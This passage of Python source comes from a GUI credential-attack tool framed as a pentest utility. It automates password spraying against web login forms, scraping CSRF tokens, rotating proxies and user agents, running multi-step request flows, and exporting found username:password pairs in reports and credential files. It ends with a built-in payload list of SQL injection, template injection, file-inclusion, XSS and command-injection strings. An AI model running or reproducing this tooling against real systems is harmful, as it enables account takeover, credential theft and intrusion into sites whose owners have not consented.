			public_suffix_2 = {"co.uk", "com.au", "co.jp", "com.br", "com.tr", "com.mx", "com.ar", "com.sg"}
			domain = ""
			if len(parts) >= 2:
				last_two = ".".join(parts[-2:])
				if last_two in public_suffix_2 and len(parts) >= 3:
					domain = ".".join(parts[-3:])
				else:
					domain = last_two
			self.var_email_domain.set(domain)
		except Exception:
			pass

	def on_export_report_json(self) -> None:
		snapshot = self._report_snapshot()
		path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON", "*.json"), ("All files", "*.*")])
		if not path:
			return
		try:
			with open(path, "w", encoding="utf-8") as f:
				json.dump(snapshot, f, indent=2)
			self._append_preview(f"Saved report JSON to {path}")
		except Exception as exc:
			messagebox.showerror("Export failed", str(exc))

	def on_export_report_csv(self) -> None:
		snapshot = self._report_snapshot()
		path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv"), ("All files", "*.*")])
		if not path:
			return
		try:
			lines = []
			s = snapshot
			lines.append("metric,value")
			for k in ["attempts", "successes", "failures", "lockouts", "errors", "rps_10s", "latency_p50_ms", "latency_p95_ms", "latency_p99_ms"]:
				lines.append(f"{k},{s.get(k,'')}")
			lines.append("status_code,count")
			for code, cnt in sorted((s.get("status_counts") or {}).items()):
				lines.append(f"{code},{cnt}")
			with open(path, "w", encoding="utf-8") as f:
				f.write("\n".join(lines))
			self._append_preview(f"Saved report CSV to {path}")
		except Exception as exc:
			messagebox.showerror("Export failed", str(exc))

	_report_snapshot = _report_snapshot

	def run(self) -> None:
		try:
			self.root.mainloop()
		except Exception as exc:
			# Last-resort graceful exit
			try:
				self.ui_queue.put(("log", f"Fatal UI error: {exc}"))
			except Exception:
				pass
			finally:
				try:
					self.root.destroy()
				except Exception:
					os._exit(1)

	def _apply_form_autodiscovery(self, cfg: dict) -> dict:
		# Fetch URL, parse form to determine action, method, fields
		from html.parser import HTMLParser
		try:
			from bs4 import BeautifulSoup
		except Exception:
			BeautifulSoup = None
		def fetch(url):
			try:
				resp = requests.get(url, timeout=cfg.get('timeout', 15), verify=cfg.get('verify', True))
				return resp
			except Exception as exc:
				self.ui_queue.put(("log", f"[Form] fetch error: {exc}"))
				return None
		original_page_url = cfg['url']
		resp = fetch(original_page_url)
		if resp is None or not resp.text:
			return cfg
		html = resp.text
		form_info = None
		if BeautifulSoup is not None:
			soup = BeautifulSoup(html, 'html.parser')
			forms = soup.find_all('form')
			candidates = []
			for f in forms:
				inputs = f.find_all('input')
				names = {i.get('name','').lower() for i in inputs}
				if any(n in names for n in ['username','user','email','login']) and any(n in names for n in ['password','pass','pwd']):
					candidates.append(f)
			if candidates:
				f = candidates[0]
				action = f.get('action') or cfg['url']
				method = (f.get('method') or cfg['method']).upper()
				hidden = {i.get('name'): i.get('value','') for i in f.find_all('input', {'type':'hidden'}) if i.get('name')}
				# Guess param names
				up = cfg['user_param']
				pp = cfg['pass_param']
				for i in f.find_all('input'):
					name = (i.get('name') or '').lower()
					if name in ['username','user','email','login']:
						up = i.get('name')
					if name in ['password','pass','pwd']:
						pp = i.get('name')
				# Resolve URL
				from urllib.parse import urljoin
				new_url = urljoin(cfg['url'], action)
				cfg = dict(cfg)
				cfg['url'] = new_url
				cfg['method'] = method
				cfg['user_param'] = up
				cfg['pass_param'] = pp
				extra = dict(cfg.get('extra_params') or {})
				extra.update(hidden)
				cfg['extra_params'] = extra
				# CSRF token name heuristic
				for k in hidden.keys():
					if any(tok in k.lower() for tok in ['csrf','token','authenticity']):
						cfg['_csrf_field'] = k
						break
				cfg['_form_page_url'] = original_page_url
		return cfg

	def _save_checkpoint(self, cfg: dict, pwd_idx: int, user_idx: int) -> None:
		try:
			if not cfg.get('checkpoint', {}).get('enabled'):
				return
			path = cfg.get('checkpoint', {}).get('file') or ''
			if not path:
				return
			state = {
				"spray": bool(cfg.get('spray_enabled')),
				"pwd_idx": int(pwd_idx),
				"user_idx": int(user_idx),
				"ts": time.time(),
			}
			with self._checkpoint_lock:
				with open(path, 'w', encoding='utf-8') as f:
					json.dump(state, f)
		except Exception:
			pass

	def _load_checkpoint(self, cfg: dict):
		try:
			path = cfg.get('checkpoint', {}).get('file') or ''
			if not path or not os.path.exists(path):
				return None
			with open(path, 'r', encoding='utf-8') as f:
				return json.load(f)
		except Exception:
			return None

	def on_browse_checkpoint_file(self) -> None:
		path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON", "*.json"), ("All files", "*.*")])
		if not path:
			return
		self.var_checkpoint_file.set(path)

	def on_export_report_html(self) -> None:
		s = self._report_snapshot()
		path = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML", "*.html"), ("All files", "*.*")])
		if not path:
			return
		try:
			# Build RPS buckets last 60s
			with self.metrics_lock:
				ats = list(self.metrics["attempt_timestamps"])  # copy
			now = time.time()
			buckets = [0]*60
			for t in ats:
				d = int(now - t)
				if 0 <= d < 60:
					buckets[59 - d] += 1
			notes_html = f"<h3>Analyst Notes</h3><pre>{html.escape(self.notes_text.get('1.0','end-1c'))}</pre>" if hasattr(self, 'notes_text') else ""
			creds = list(getattr(self, 'found_credentials', []))
			def _esc(v):
				try:
					return html.escape(str(v))
				except Exception:
					return ""
			creds_rows = "".join(f"<tr><td>{_esc(c.get('username',''))}</td><td>{_esc(c.get('password',''))}</td><td>{_esc(c.get('status',''))}</td><td>{_esc(c.get('latency_ms',''))}</td><td>{_esc(c.get('proxy',''))}</td><td>{_esc(c.get('ua',''))}</td></tr>" for c in creds)
			creds_table = f"<div class='card'><h3>Found Credentials</h3><table border='1' cellpadding='4' cellspacing='0'><tr><th>User</th><th>Pass</th><th>Status</th><th>Latency</th><th>Proxy</th><th>UA</th></tr>{creds_rows}</table></div>" if creds else ""
			html_doc = f"""
			<!doctype html>
			<html><head><meta charset='utf-8'>
			<title>Pentest Report</title>
			<script src='https://cdn.jsdelivr.net/npm/chart.js'></script>
			<style>body{{font-family:sans-serif;margin:20px}} .grid{{display:grid;grid-template-columns:1fr 1fr;gap:16px}} .card{{border:1px solid #ddd;padding:12px;border-radius:8px}}</style>
			</head><body>
			<h1>Pentest Report</h1>
			<div class='grid'>
				<div class='card'><h3>Summary</h3>
				<pre>{json.dumps(s, indent=2)}</pre></div>
				{notes_html}
				{creds_table}
			</div>
			<canvas id='c' height='120'></canvas>
			<script>const d={json.dumps(buckets)};new Chart(document.getElementById('c').getContext('2d'),{{type:'line',data:{{labels:d.map((_,i)=>i-59),datasets:[{{label:'RPS',data:d,borderColor:'#2a7',tension:0.25}}]}},options:{{plugins:{{legend:{{display:false}}}},scales:{{x:{{display:false}},y:{{beginAtZero:true}}}}}}}});</script>
			</body></html>
			"""
			with open(path, 'w', encoding='utf-8') as f:
				f.write(html_doc)
			self._append_preview(f"Saved HTML report to {path}")
		except Exception as exc:
			messagebox.showerror("Export failed", str(exc))

	def _fetch_csrf_sync(self, sess: requests.Session, cfg: dict) -> dict:
		# Fetch login page and extract hidden tokens; return dict of params to merge
		page_url = cfg.get('_form_page_url') or cfg.get('url')
		try:
			resp = sess.get(page_url, timeout=cfg.get('timeout', 15), verify=cfg.get('verify', True))
			html = resp.text or ''
			from bs4 import BeautifulSoup
			soup = BeautifulSoup(html, 'html.parser')
			hidden = {i.get('name'): i.get('value','') for i in soup.find_all('input', {'type':'hidden'}) if i.get('name')}
			# prefer known csrf field
			params = {}
			if cfg.get('_csrf_field') and cfg.get('_csrf_field') in hidden:
				params[cfg['_csrf_field']] = hidden[cfg['_csrf_field']]
			else:
				for k in hidden.keys():
					if any(tok in (k or '').lower() for tok in ['csrf','token','authenticity']):
						params[k] = hidden[k]
						break
			return params
		except Exception:
			return {}

	async def _fetch_csrf_async(self, client, cfg: dict) -> dict:
		page_url = cfg.get('_form_page_url') or cfg.get('url')
		try:
			resp = await client.get(page_url, timeout=cfg.get('timeout', 15))
			html = resp.text or ''
			from bs4 import BeautifulSoup
			soup = BeautifulSoup(html, 'html.parser')
			hidden = {i.get('name'): i.get('value','') for i in soup.find_all('input', {'type':'hidden'}) if i.get('name')}
			params = {}
			if cfg.get('_csrf_field') and cfg.get('_csrf_field') in hidden:
				params[cfg['_csrf_field']] = hidden[cfg['_csrf_field']]
			else:
				for k in hidden.keys():
					if any(tok in (k or '').lower() for tok in ['csrf','token','authenticity']):
						params[k] = hidden[k]
						break
			return params
		except Exception:
			return {}

	def _run_prelogin_chain_sync(self, sess: requests.Session, cfg: dict, headers: dict | None, proxies: dict | None) -> None:
		urls = cfg.get('prelogin', {}).get('urls') or []
		for u in urls:
			try:
				sess.get(u, timeout=cfg.get('timeout', 15), headers=headers, proxies=proxies, allow_redirects=True)
			except Exception:
				pass
		if cfg.get('prelogin', {}).get('headless_js'):
			self._prelogin_js_sync(sess, urls[-1] if urls else cfg.get('_form_page_url') or cfg['url'])

	def _maybe_capture_artifact(self, cfg: dict, user: str, pwd: str, method: str, url: str, headers: dict, params: dict, resp, success: bool, proxy: str | None, ua: str | None, latency_ms: int) -> None:
		if not self.var_capture_enabled.get():
			return
		try:
			if success is False:
				if self._failures_captured >= int(self.var_capture_failures_n.get() or 0):
					return
				self._failures_captured += 1
			max_n = int(self.var_capture_max_artifacts.get() or 0)
			if max_n <= 0:
				return
			if len(self.captured_artifacts) >= max_n:
				return
			max_bytes = int(self.var_capture_max_bytes.get() or 65536)
			# Build raw request
			req_lines = [f"{method} {url} HTTP/1.1"]
			for k,v in (headers or {}).items():
				req_lines.append(f"{k}: {v}")
			body = urlencode(params or {})
			raw_req = "\n".join(req_lines) + ("\n\n" + body if body else "")
			# Build raw response (truncate)
			status = getattr(resp, 'status_code', '')
			resp_headers = getattr(resp, 'headers', {}) or {}
			rep_lines = [f"HTTP/1.1 {status}"]
			for k,v in resp_headers.items():
				rep_lines.append(f"{k}: {v}")
			try:
				text = resp.text if resp is not None else ""
			except Exception:
				text = ""
			raw_resp = "\n".join(rep_lines) + "\n\n" + (text[:max_bytes] if text else "")
			self.captured_artifacts.append({
				"timestamp": datetime.now().isoformat(timespec='seconds'),
				"user": user,
				"password": pwd,
				"method": method,
				"url": url,
				"headers": dict(headers or {}),
				"params": dict(params or {}),
				"status": status,
				"latency_ms": latency_ms,
				"proxy": proxy or "",
				"ua": ua or "",
				"raw_request": raw_req,
				"raw_response": raw_resp,
				"curl": self._build_curl(method, url, headers or {}, params or {}, proxy),
			})
		except Exception:
			pass

	def _build_curl(self, method: str, url: str, headers: dict, params: dict, proxy: str | None) -> str:
		parts = ["curl", "-i", "-sS"]
		if proxy:
			parts += ["--proxy", proxy]
		for k,v in (headers or {}).items():
			parts += ["-H", f"{k}: {v}"]
		if method.upper() == 'GET':
			if params:
				from urllib.parse import urlencode as _ue
				qs = _ue(params)
				url2 = url + ("&" if "?" in url else "?") + qs
				parts += ["-X", "GET", url2]
			else:
				parts += ["-X", "GET", url]
		else:
			from urllib.parse import urlencode as _ue
			data = _ue(params or {})
			parts += ["-X", method.upper(), url, "--data", data]
		return " ".join(parts)

	def on_export_artifacts(self) -> None:
		if not self.captured_artifacts:
			messagebox.showinfo("Artifacts", "No captured artifacts to export.")
			return
		dirpath = filedialog.askdirectory()
		if not dirpath:
			return
		try:
			for i, a in enumerate(self.captured_artifacts, 1):
				prefix = os.path.join(dirpath, f"artifact_{i:03d}")
				with open(prefix + ".request.txt", 'w', encoding='utf-8') as f:
					f.write(a.get('raw_request',''))
				with open(prefix + ".response.txt", 'w', encoding='utf-8') as f:
					f.write(a.get('raw_response',''))
				with open(prefix + ".curl.sh", 'w', encoding='utf-8') as f:
					f.write(a.get('curl',''))
			self._append_preview(f"Exported {len(self.captured_artifacts)} artifacts to {dirpath}")
		except Exception as exc:
			messagebox.showerror("Export failed", str(exc))

	def on_import_curl_file(self) -> None:
		path = filedialog.askopenfilename(filetypes=[("All", "*.*")])
		if not path:
			return
		try:
			with open(path, 'r', encoding='utf-8', errors='ignore') as f:
				cmd = f.read()
			cfg = self._parse_curl(cmd)
			self._apply_imported_request(cfg)
		except Exception as exc:
			messagebox.showerror("Import failed", str(exc))

	def on_import_burp_file(self) -> None:
		path = filedialog.askopenfilename(filetypes=[("All", "*.*")])
		if not path:
			return
		try:
			with open(path, 'r', encoding='utf-8', errors='ignore') as f:
				raw = f.read()
			cfg = self._parse_burp_raw(raw)
			self._apply_imported_request(cfg)
		except Exception as exc:
			messagebox.showerror("Import failed", str(exc))

	def _apply_imported_request(self, imp: dict) -> None:
		if not imp:
			return
		# Set fields
		self.var_http_method.set(imp.get('method', self.var_http_method.get()))
		self.var_target_url.set(imp.get('url', self.var_target_url.get()))
		# headers
		try:
			self.var_headers_json.set(json.dumps(imp.get('headers', {}), indent=0))
		except Exception:
			pass
		# body
		self.var_body_mode.set(imp.get('body_mode', self.var_body_mode.get()))
		self.raw_body_text.delete('1.0', tk.END)
		self.raw_body_text.insert(tk.END, imp.get('raw_body', ''))
		# params
		extra = imp.get('params', {})
		if extra:
			self.var_extra_params.set("&".join(f"{k}={v}" for k,v in extra.items()))
		# attempt to set param names if guessed
		if imp.get('user_param'):
			self.var_user_param.set(imp['user_param'])
		if imp.get('pass_param'):
			self.var_pass_param.set(imp['pass_param'])

	def _parse_curl(self, cmd: str) -> dict:
		import shlex
		args = shlex.split(cmd)
		imp = {"headers": {}, "params": {}, "body_mode": "params", "raw_body": ""}
		it = iter(args)
		url = None; method = None; data = None
		for token in it:
			if token.lower() == 'curl':
				continue
			if token == '-X':
				method = next(it, None)
			elif token in ('-H','--header'):
				h = next(it, '')
				if ':' in h:
					k,v = h.split(':',1); imp['headers'][k.strip()] = v.strip()
			elif token.startswith('http'):
				url = token
			elif token in ('--data','--data-raw','--data-binary','--data-urlencode','-d'):
				data = next(it, '')
		# body detection
		ct = (imp['headers'].get('Content-Type') or imp['headers'].get('content-type') or '').lower()
		if data:
			if 'application/json' in ct:
				imp['body_mode'] = 'json'; imp['raw_body'] = data
			else:
				imp['body_mode'] = 'raw'; imp['raw_body'] = data
		imp['url'] = url or ''
		imp['method'] = method or 'POST'
		# try param names guess
		imp['user_param'] = self.var_user_param.get()
		imp['pass_param'] = self.var_pass_param.get()
		return imp

	def _parse_burp_raw(self, raw: str) -> dict:
		lines = raw.splitlines()
		if not lines:
			return {}
		req_line = lines[0]
		method, path, _ = req_line.split(' ',2)
		headers = {}
		body = ""
		host = None
		sep = lines.index('') if '' in lines else len(lines)
		for h in lines[1:sep]:
			if ':' in h:
				k,v = h.split(':',1); headers[k.strip()] = v.strip()
		host = headers.get('Host') or headers.get('host')
		if sep < len(lines)-1:
			body = "\n".join(lines[sep+1:])
		protocol = 'https' if headers.get('X-Forwarded-Proto','').lower()=='https' else 'http'
		url = f"{protocol}://{host}{path}" if host else path
		imp = {"method": method, "url": url, "headers": headers, "params": {}, "body_mode": "params", "raw_body": ""}
		ct = (headers.get('Content-Type') or headers.get('content-type') or '').lower()
		if body:
			if 'application/json' in ct:
				imp['body_mode'] = 'json'; imp['raw_body'] = body
			elif 'application/x-www-form-urlencoded' in ct:
				imp['body_mode'] = 'params'
				try:
					from urllib.parse import parse_qsl
					imp['params'] = dict(parse_qsl(body, keep_blank_values=True))
				except Exception:
					pass
			else:
				imp['body_mode'] = 'raw'; imp['raw_body'] = body
		# guess param names
		for k in ('username','user','email','login'):
			if k in (imp['params'] or {}):
				imp['user_param'] = k
				break
		for k in ('password','pass','pwd'):
			if k in (imp['params'] or {}):
				imp['pass_param'] = k
				break
		return imp

	def on_export_evidence_bundle(self) -> None:
		s = self._report_snapshot()
		dirpath = filedialog.askdirectory()
		if not dirpath:
			return
		try:
			# HTML
			path_html = os.path.join(dirpath, 'report.html')
			# reuse HTML export logic
			with self.metrics_lock:
				ats = list(self.metrics["attempt_timestamps"])  # copy
			now = time.time()
			buckets = [0]*60
			for t in ats:
				d = int(now - t)
				if 0 <= d < 60:
					buckets[59 - d] += 1
			notes_html = f"<h3>Analyst Notes</h3><pre>{html.escape(self.notes_text.get('1.0','end-1c'))}</pre>" if hasattr(self, 'notes_text') else ""
			creds = list(getattr(self, 'found_credentials', []))
			def _esc(v):
				try:
					return html.escape(str(v))
				except Exception:
					return ""
			creds_rows = "".join(f"<tr><td>{_esc(c.get('username',''))}</td><td>{_esc(c.get('password',''))}</td><td>{_esc(c.get('status',''))}</td><td>{_esc(c.get('latency_ms',''))}</td><td>{_esc(c.get('proxy',''))}</td><td>{_esc(c.get('ua',''))}</td></tr>" for c in creds)
			creds_table = f"<div class='card'><h3>Found Credentials</h3><table border='1' cellpadding='4' cellspacing='0'><tr><th>User</th><th>Pass</th><th>Status</th><th>Latency</th><th>Proxy</th><th>UA</th></tr>{creds_rows}</table></div>" if creds else ""
			html_doc = f"""
			<!doctype html>
			<html><head><meta charset='utf-8'><script src='https://cdn.jsdelivr.net/npm/chart.js'></script></head><body><h1>Pentest Report</h1>{notes_html}{creds_table}<pre>{json.dumps(s, indent=2)}</pre><canvas id='c' height='120'></canvas><script>const d={json.dumps(buckets)};new Chart(document.getElementById('c').getContext('2d'),{{type:'line',data:{{labels:d.map((_,i)=>i-59),datasets:[{{label:'RPS',data:d,borderColor:'#2a7',tension:0.25}}]}},options:{{plugins:{{legend:{{display:false}}}},scales:{{x:{{display:false}},y:{{beginAtZero:true}}}}}}}});</script></body></html>
			"""
			with open(path_html, 'w', encoding='utf-8') as f:
				f.write(html_doc)
			# JSON
			with open(os.path.join(dirpath, 'report.json'), 'w', encoding='utf-8') as f:
				json.dump(s, f, indent=2)
			# CSV
			lines = ["metric,value"]
			for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
				lines.append(f"{k},{s.get(k,'')}")
			lines.append("status_code,count")
			for code, cnt in sorted((s.get("status_counts") or {}).items()):
				lines.append(f"{code},{cnt}")
			with open(os.path.join(dirpath, 'report.csv'), 'w', encoding='utf-8') as f:
				f.write("\n".join(lines))
			# Credentials
			if creds:
				with open(os.path.join(dirpath, 'credentials.csv'), 'w', encoding='utf-8') as f:
					f.write("username,password,status,latency_ms,proxy,ua,timestamp\n")
					for c in creds:
						f.write(f"{c.get('username','')},{c.get('password','')},{c.get('status','')},{c.get('latency_ms','')},{c.get('proxy','')},{c.get('ua','')},{c.get('timestamp','')}\n")
				with open(os.path.join(dirpath, 'credentials.txt'), 'w', encoding='utf-8') as f:
					for c in creds:
						f.write(f"{c.get('username','')}:{c.get('password','')}\n")
			# Artifacts
			self._export_artifacts_to_dir(dirpath)
			# HAR
			har = self._build_har()
			with open(os.path.join(dirpath, 'session.har'), 'w', encoding='utf-8') as f:
				json.dump(har, f, indent=2)
			# Screenshot
			self._screenshot_target(self.var_target_url.get().strip(), os.path.join(dirpath, 'screenshot.png'))
			self._append_preview(f"Evidence bundle saved to {dirpath}")
		except Exception as exc:
			messagebox.showerror("Export failed", str(exc))

	def _export_artifacts_to_dir(self, dirpath: str) -> None:
		if not self.captured_artifacts:
			return
		for i, a in enumerate(self.captured_artifacts, 1):
			prefix = os.path.join(dirpath, f"artifact_{i:03d}")
			try:
				with open(prefix + ".request.txt", 'w', encoding='utf-8') as f:
					f.write(a.get('raw_request',''))
				with open(prefix + ".response.txt", 'w', encoding='utf-8') as f:
					f.write(a.get('raw_response',''))
				with open(prefix + ".curl.sh", 'w', encoding='utf-8') as f:
					f.write(a.get('curl',''))
			except Exception:
				pass

	def _build_har(self) -> dict:
		entries = []
		for a in self.captured_artifacts:
			req_headers = [{"name":k, "value":v} for k,v in (a.get('headers') or {}).items()]
			query = []
			postData = None
			if a.get('method','GET').upper() == 'GET':
				from urllib.parse import urlparse, parse_qsl
				parsed = urlparse(a.get('url',''))
				query = [{"name":k, "value":v} for k,v in parse_qsl(parsed.query, keep_blank_values=True)]
			else:
				postData = {
					"mimeType": (a.get('headers',{}).get('Content-Type') or 'application/x-www-form-urlencoded'),
					"text": urlencode(a.get('params') or {})
				}
			entries.append({
				"startedDateTime": a.get('timestamp'),
				"time": a.get('latency_ms', 0),
				"request": {
					"method": a.get('method','GET'),
					"url": a.get('url',''),
					"httpVersion": "HTTP/1.1",
					"headers": req_headers,
					"queryString": query,
					"postData": postData,
					"headersSize": -1,
					"bodySize": -1,
				},
				"response": {
					"status": int(a.get('status') or 0),
					"statusText": "",
					"httpVersion": "HTTP/1.1",
					"headers": [],
					"content": {"size": len(a.get('raw_response','')), "mimeType": "text/html", "text": a.get('raw_response','')[: int(self.var_capture_max_bytes.get() or 65536)]},
					"redirectURL": "",
					"headersSize": -1,
					"bodySize": -1,
				},
				"cache": {},
				"timings": {"send": 0, "wait": a.get('latency_ms', 0), "receive": 0}
			})
		return {"log": {"version": "1.2", "creator": {"name": "SoupSalad", "version": "1.0"}, "entries": entries}}

	def _screenshot_target(self, url: str, out_path: str) -> None:
		if not url:
			return
		try:
			from playwright.sync_api import sync_playwright
		except Exception:
			return
		try:
			with sync_playwright() as p:
				browser = p.chromium.launch(headless=True)
				page = browser.new_page()
				page.goto(url, wait_until='domcontentloaded', timeout=15000)
				page.screenshot(path=out_path, full_page=True)
				browser.close()
		except Exception:
			pass

	def on_export_pdf(self) -> None:
		# Build the same HTML as report and render to PDF via wkhtmltopdf
		target = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF", "*.pdf"), ("All files", "*.*")])
		if not target:
			return
		try:
			import tempfile, subprocess, shutil
			s = self._report_snapshot()
			with self.metrics_lock:
				ats = list(self.metrics["attempt_timestamps"])  # copy
			now = time.time()
			buckets = [0]*60
			for t in ats:
				d = int(now - t)
				if 0 <= d < 60:
					buckets[59 - d] += 1
			notes_html = f"<h3>Analyst Notes</h3><pre>{html.escape(self.notes_text.get('1.0','end-1c'))}</pre>" if hasattr(self, 'notes_text') else ""
			creds = list(getattr(self, 'found_credentials', []))
			def _esc(v):
				try:
					return html.escape(str(v))
				except Exception:
					return ""
			creds_rows = "".join(f"<tr><td>{_esc(c.get('username',''))}</td><td>{_esc(c.get('password',''))}</td><td>{_esc(c.get('status',''))}</td><td>{_esc(c.get('latency_ms',''))}</td><td>{_esc(c.get('proxy',''))}</td><td>{_esc(c.get('ua',''))}</td></tr>" for c in creds)
			creds_table = f"<div class='card'><h3>Found Credentials</h3><table border='1' cellpadding='4' cellspacing='0'><tr><th>User</th><th>Pass</th><th>Status</th><th>Latency</th><th>Proxy</th><th>UA</th></tr>{creds_rows}</table></div>" if creds else ""
			html_doc = f"""
			<!doctype html><html><head><meta charset='utf-8'><title>Pentest Report</title>
			<style>body{{font-family:sans-serif;margin:20px}} .grid{{display:grid;grid-template-columns:1fr 1fr;gap:16px}} .card{{border:1px solid #ddd;padding:12px;border-radius:8px}}</style>
			</head><body>
			<h1>Pentest Report</h1>
			{notes_html}
			<h3>Summary</h3><pre>{json.dumps(s, indent=2)}</pre>
			</body></html>
			"""
			wk = self.var_wkhtmltopdf_path.get().strip() or 'wkhtmltopdf'
			if not shutil.which(wk):
				messagebox.showerror("wkhtmltopdf not found", "Install wkhtmltopdf and ensure it's in PATH, or set its path in settings.")
				return
			with tempfile.NamedTemporaryFile('w', suffix='.html', delete=False, encoding='utf-8') as tf:
				html_path = tf.name
				tf.write(html_doc)
			cmd = [wk, html_path, target]
			try:
				subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			finally:
				try:
					os.unlink(html_path)
				except Exception:
					pass
			self._append_preview(f"Saved PDF to {target}")
		except Exception as exc:
			messagebox.showerror("Export failed", str(exc))

	def on_flow_add(self, method: str) -> None:
		self._open_flow_step_editor({"method": method, "url": "", "headers": {}, "body_mode": "params", "body": "", "extract_regex": "", "extract_var": ""})

	def on_flow_edit(self) -> None:
		item = self._selected_flow_index()
		if item is None:
			return
		self._open_flow_step_editor(self.flow_steps[item], index=item)

	def on_flow_remove(self) -> None:
		item = self._selected_flow_index()
		if item is None:
			return
		self.flow_steps.pop(item)
		self._refresh_flow_view()

	def on_flow_move(self, delta: int) -> None:
		item = self._selected_flow_index()
		if item is None:
			return
		new = max(0, min(len(self.flow_steps)-1, item + delta))
		if new == item:
			return
		self.flow_steps[item], self.flow_steps[new] = self.flow_steps[new], self.flow_steps[item]
		self._refresh_flow_view()
		self.flow_view.selection_set(self.flow_view.get_children()[new])

	def _selected_flow_index(self):
		sel = self.flow_view.selection()
		if not sel:
			return None
		return self.flow_view.index(sel[0])

	def _open_flow_step_editor(self, step: dict, index: int | None = None) -> None:
		win = tk.Toplevel(self.root)
		win.title("Edit Flow Step")
		row = 0
		method_var = tk.StringVar(value=step.get('method','GET'))
		url_var = tk.StringVar(value=step.get('url',''))
		headers_var = tk.StringVar(value=json.dumps(step.get('headers') or {}))
		body_mode_var = tk.StringVar(value=step.get('body_mode','params'))
		body_text = scrolledtext.ScrolledText(win, height=6)
		body_text.insert('1.0', step.get('body',''))
		extract_regex_var = tk.StringVar(value=step.get('extract_regex',''))
		extract_var_var = tk.StringVar(value=step.get('extract_var',''))
		self._add_labeled_entry(win, "Method (GET/POST)", method_var, row=row, col=0); row += 1
		self._add_labeled_entry(win, "URL (supports {{username}}, {{password}})", url_var, row=row, col=0); row += 1
		self._add_labeled_entry(win, "Headers JSON", headers_var, row=row, col=0); row += 1
		self._add_labeled_entry(win, "Body mode (params/json/raw)", body_mode_var, row=row, col=0); row += 1
		lbl = ttk.Label(win, text="Body template (vars allowed)"); lbl.grid(row=row, column=0, sticky='w', padx=4, pady=2); row += 1
		body_text.grid(row=row, column=0, columnspan=4, sticky='we', padx=4, pady=2); row += 1
		self._add_labeled_entry(win, "Extract regex (optional)", extract_regex_var, row=row, col=0); row += 1
		self._add_labeled_entry(win, "Extract var name", extract_var_var, row=row, col=0); row += 1
		btnf = ttk.Frame(win); btnf.grid(row=row, column=0, sticky='w')
		def save_and_close():
			try:
				new_step = {
					"method": method_var.get().strip().upper() or 'GET',
					"url": url_var.get().strip(),
					"headers": json.loads(headers_var.get().strip() or '{}'),
					"body_mode": body_mode_var.get().strip() or 'params',
					"body": body_text.get('1.0','end-1c'),
					"extract_regex": extract_regex_var.get().strip(),
					"extract_var": extract_var_var.get().strip(),
				}
			except Exception as exc:
				messagebox.showerror("Invalid step", str(exc)); return
			if index is None:
				self.flow_steps.append(new_step)
			else:
				self.flow_steps[index] = new_step
			self._refresh_flow_view()
			win.destroy()
		ttk.Button(btnf, text="Save", command=save_and_close).pack(side=tk.LEFT, padx=4)
		ttk.Button(btnf, text="Cancel", command=win.destroy).pack(side=tk.LEFT, padx=4)
		for i in range(0, 4):
			win.grid_columnconfigure(i, weight=1)

	def _refresh_flow_view(self) -> None:
		for i in self.flow_view.get_children():
			self.flow_view.delete(i)
		for idx, step in enumerate(self.flow_steps, 1):
			self.flow_view.insert('', 'end', values=(idx, step.get('method',''), step.get('url',''), step.get('extract_var','')))

	def _format_template(self, templ: str, context: dict) -> str:
		try:
			for k, v in context.items():
				templ = templ.replace(f"{{{{{k}}}}}", str(v))
			return templ
		except Exception:
			return templ

	def _run_flow_sync(self, sess, cfg: dict, username: str, password: str) -> None:
		context = {
			"username": username,
			"password": password,
		}
		for step_index, step in enumerate(self.flow_steps):
			method = (step.get('method') or 'GET').upper()
			url = self._format_template(step.get('url') or '', context)
			if not url:
				continue
			headers = step.get('headers') or {}
			body_mode = step.get('body_mode') or 'params'
			body_templ = step.get('body') or ''
			data = None
			json_payload = None
			if method == 'GET':
				params = {}
				if body_templ.strip():
					# allow key=value&... or JSON
					try:
						params = dict(x.split('=',1) for x in self._format_template(body_templ, context).split('&') if '=' in x)
					except Exception:
						params = {}
				resp = sess.get(url, params=params, timeout=cfg['timeout'], headers=headers)
			else:
				if body_mode == 'json':
					try:
						json_payload = json.loads(self._format_template(body_templ, context))
					except Exception:
						data = self._format_template(body_templ, context)
				else:
					data = self._format_template(body_templ, context)
				resp = sess.post(url, json=json_payload, data=data if json_payload is None else None, timeout=cfg['timeout'], headers=headers)
			# extract
			re_pat = (step.get('extract_regex') or '').strip()
			re_var = (step.get('extract_var') or '').strip()
			if re_pat and re_var:
				try:
					m = re.search(re_pat, resp.text or '')
					if m:
						context[re_var] = m.group(1) if m.groups() else m.group(0)
						self.ui_queue.put(("log", f"[Flow] Extracted {re_var}"))
				except Exception as _exc:
					self.ui_queue.put(("log", f"[Flow] Extract failed: {_exc}"))
		# remember last context for templating in login request
		try:
			self.flow_context_last = dict(context)
		except Exception:
			self.flow_context_last = {}

	def _build_http_auth(self, cfg: dict, attempt_user: str | None = None, attempt_pwd: str | None = None):
		atype = (cfg.get('auth_type') or 'None').strip()
		user = attempt_user if attempt_user is not None else (cfg.get('auth_user') or '')
		pwd = attempt_pwd if attempt_pwd is not None else (cfg.get('auth_pass') or '')
		domain = cfg.get('auth_domain') or ''
		if atype == 'Basic':
			return (user, pwd)
		if atype == 'Digest' and HTTPDigestAuth is not None:
			return HTTPDigestAuth(user, pwd)
		if atype == 'NTLM' and requests_ntlm is not None:
			principal = f"{domain}\\{user}" if domain else user
			return requests_ntlm.HttpNtlmAuth(principal, pwd)
		return None

	def _intruder_builtin_payloads(self, kind: str) -> list[str]:
		k = (kind or 'none').lower()
		if k == 'sqli':
			return ["' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1","') OR ('1'='1","admin' --","' UNION SELECT NULL--"]
		if k == 'ssti':
			return ["{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>"]
		if k == 'lfi':
			return ["../../../../etc/passwd","..\\..\\..\\..\\windows\\win.ini","/etc/passwd","..%2f..%2f..%2fetc%2fpasswd"]
		if k == 'traversal':
			return ["..%2f","..\\","..//","..\\..\\"]
		if k == 'xss':
			return ["<script>alert(1)</script>","\"/><svg onload=alert(1)>","'><img src=x onerror=alert(1)>"]
		if k == 'cmdi':
			return [";id","|id","& whoami","$(id)"]
		return []

